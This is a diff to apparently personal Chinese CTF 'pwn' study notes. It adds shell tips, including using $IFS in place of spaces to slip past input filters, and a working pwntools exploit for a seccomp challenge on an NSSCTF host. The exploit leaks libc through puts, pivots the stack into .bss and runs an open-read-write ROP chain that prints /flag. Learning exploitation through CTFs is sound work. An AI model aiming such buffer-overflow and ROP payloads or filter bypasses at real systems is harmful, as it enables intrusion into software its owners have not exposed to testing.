@@ -66,6 +66,18 @@ chmod：指令，修改权限	-x：执行的权限	./pwn2：目标文件
 
 `nm pwn | grep "puts"`	：查看特定函数的地址
 
+`tac file`
+
+```
+逆向读取数据，主要是逆行，比如有两行数据，cat是第一行第二行的读，tac是第二行第一行的读，单行数据不变
+```
+
+`$IFS`
+
+```
+可以代替空格
+```
+
 
 
 #### `objdump`
@@ -643,9 +655,109 @@ write_addr = libc_base + 0x10e060
 
 由于实际栈不够大，我们的shellcode写不下，所以就得迁栈。
 
+我去了，真没招了，硬编码的地址，不如人家pwntools自动加载出来的方便。
+
+```
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+main=elf.sym['main']
+pop_rdi_ret=rop.rdi.address
+
+buf = elf.bss()+0x300
+直接用pwntools可以直接加载地址，不需要我们去写0x什么什么的地址
+```
+
+我后面是根据别人的wp借鉴，总结的。
+
+**第一次**
+
+利用 `puts` 函数打印出它自己在内存中的真实地址，从而计算出 `libc` 的基地址，进而算出 `open`、`read`、`write`（ORW）的绝对地址。
+
+**第二次**
+
+调用 `read` 函数，将我们的 orw 链用 rop 技术，读取并写入到 `bss` 段（也就是 `buf`）。
+
+**第三次**
+
+利用垃圾数据（`b'a'*0x108`）填充到返回地址，然后接上 `pop_rsp_ret` 以及 `buf` 的地址。程序执行到最后，通过 `pop rsp` 将 CPU 的栈顶指针劫持到 `bss` 段的 `buf` 处。因为此时 `buf` 里已经装满了 ORW ROP 链，所以程序就跑去执行rop，一个一个跳转执行了orw。
+
+```
+from pwn import *
+
+context.arch='amd64'
+
+r=remote("node5.anna.nssctf.cn",21954)
+elf=ELF("./vuln")
+rop=ROP("./vuln")
+libc=ELF("./libc-2.31.so")
+
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+main=elf.sym['main']
+pop_rdi_ret=rop.rdi.address
+
+buf = elf.bss()+0x300
+
+r.recvuntil(b'Maybe you can learn something about seccomp, before you try to solve this task.')
+payload=b'A'*0x108+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
+
+r.send(payload) # 第一次溢出
+r.recv()
+puts_addr=u64(r.recvuntil(b'\x7f').ljust(8,b'\x00'))
+
+libcbase=puts_addr-libc.symbols['puts']
+pop_rsi_ret=0x2601f+libcbase
+pop_rdx_ret=0x142c92+libcbase
+pop_rsp_ret=0x2f70a+libcbase
+
+
+_open = libcbase + libc.sym['open']
+_write = libcbase + libc.sym['write']
+_read = elf.sym['read']
+flag = buf + 0x98
+
+ropchain = p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(0) + p64(_open) # open(0,/flag)
+
+ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf + 0x200) + p64(pop_rdx_ret) + p64(0x30) + p64(_read) # read(3,buf,0x30)
+
+ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf+0x200) + p64(pop_rdx_ret) + p64(0x30) + p64(_write) # write(3,buf,0x30)
+
+ropchain+=b'/flag\x00' #这个写法我第一见，因为本身我们无法让open函数直接找到/flag的地址，open是要内存地址的，所以这边通过在结尾加入字符串的形式，让寄存器rdi直接指向这个字符串，就让open读到。
+
+r.recvuntil(b'Maybe you can learn something about seccomp, before you try to solve this task.')
+r.send(b'A'*0x108+p64(pop_rsi_ret)+p64(buf)+p64(_read)+p64(main))
+sleep(0.5)
+
+r.send(ropchain) # 第二次溢出，写入bss段的rop-orw链
+
+r.recvuntil(b'Maybe you can learn something about seccomp, before you try to solve this task.')
+r.send(b'a'*0x108+p64(pop_rsp_ret)+p64(buf)) # 第三次溢出
+
+r.interactive()
+
+```
 
 
 
+```
+地址          内容 (每格 8 字节)          
+-----------------------------------
+
+buf        : [ p64(pop_rdi_ret) ]  
+buf + 0x08 : [ buf + 0x98       ]  
+...
+buf + 0x28 : [ p64(pop_rdi_ret) ]  
+...
+buf + 0x60 : [ p64(pop_rdi_ret) ] 
+...
+buf + 0x90 : [ p64(_write)      ]  
+buf + 0x98 : [ '/flag\x00'      ] 
+
+```
+
+
+
+没招了，思路真对，但我现在还真无法手搓这个脚本。
 
 
 
